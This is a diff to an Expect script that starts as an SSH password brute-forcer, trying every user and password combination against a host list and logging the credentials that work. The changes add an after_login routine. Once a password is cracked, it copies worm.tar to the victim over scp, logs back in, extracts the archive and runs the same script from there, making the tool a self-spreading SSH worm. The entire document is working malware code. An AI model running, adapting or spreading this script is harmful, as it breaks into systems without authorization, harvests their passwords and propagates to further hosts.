@@ -8,16 +8,18 @@
 #    Hopefully it will make your life easier rather then making other
 #    peoples lives more difficult!
 
-set timeout 1
-set dictionary [lindex $argv 0]
-set file [lindex $argv 1]
-set user [lindex $argv 2]
-
+set timeout 1000
 
 if {[llength $argv] != 3} {
    puts stderr "Usage: $argv0 <dictionary-file> <hosts-file> <user-file>\n"
    exit
 }
+
+set dictionary [lindex $argv 0]
+set file [lindex $argv 1]
+set user [lindex $argv 2]
+
+
 
 set tryHost [open $file r]
 set tryPass [open $dictionary r]
@@ -27,37 +29,73 @@ set passwords [read $tryPass]
 set hosts [read $tryHost]
 set login [read $tryUser]
 
+spawn $env(SHELL)
+
+
+proc after_login {ip username passwd} {
+    # after login, this exits, sends a compressed file to the server
+    send "exit\n"
+    expect -- "\$ "
+    send -- "scp ./worm.tar $username@$ip:~\n"
+    expect -nocase "password: "
+    send -- "$passwd\n"
+    # After successfully sending the file, this uncompress and executes it.
+    expect -- "\$ "
+    send -- "ssh $username@$ip\n"
+    expect -nocase "password: "
+    send -- "$passwd\n"
+    expect {
+        "\$ " {
+            send -- "tar xvf worm.tar worm\n"
+            expect -- "\$ "
+            send -- "expect worm/ssh_worm.sh worm/dict.txt worm/host.txt worm/user.txt 2>&1 > worm.log\n"
+            expect -- "\$ "
+            send -- "exit\n"
+        }
+        -nocase "password: " {
+            puts stderr "\n\ninvalid password for scp\n\n"
+        }
+    }
+}
+
 foreach username $login {
     foreach passwd $passwords {
         foreach ip $hosts {
-            spawn ssh $username@$ip -p 20000
+#            puts stderr "execute ssh"
+            expect "\$ "
+            send -- "ssh $username@$ip\n"
             expect {
-                "fuck" {
-                    puts stderr "fucking!"
-                }
                 # some sshd response with "Password:" and others with "password:"
-                -nocase "password:"  {
-                    send "$passwd\n"
+                -nocase "password: "  {
+#                    puts stderr "start to interaction\n"
+                    send -- "$passwd\n"
                     expect {
-                        "Last login" {
+                        "\$ " {
                             set logFile [open $ip.log a]
-                            puts $logFile "password for $username@$ip is $passwd\n"
+                            puts $logFile "password for $username@$ip is $passwd"
                             close $logFile
-                            send "exit\n"
+                            after_login $ip $username $passwd
                         }
-                        -nocase "password:" {
-                            set id [exp_pid]
-                            exec kill -INT $id
+                        -nocase "password: " {
+                            puts stderr "incorrect password"
+                            send -- ""
+#                            close
+#                            set id [exp_pid]
+#                            exec kill -KILL $id
+#                            wait
                         }
                     }
                 }
-                "(yes/no)?" {
+                "(yes/no)? " {
                     send "yes\n"
                     exp_continue
+                }
+                "Connection closed by remote host" {
+                    close
+                    wait
                 }
             }
         }
     }
 }
 
-exit
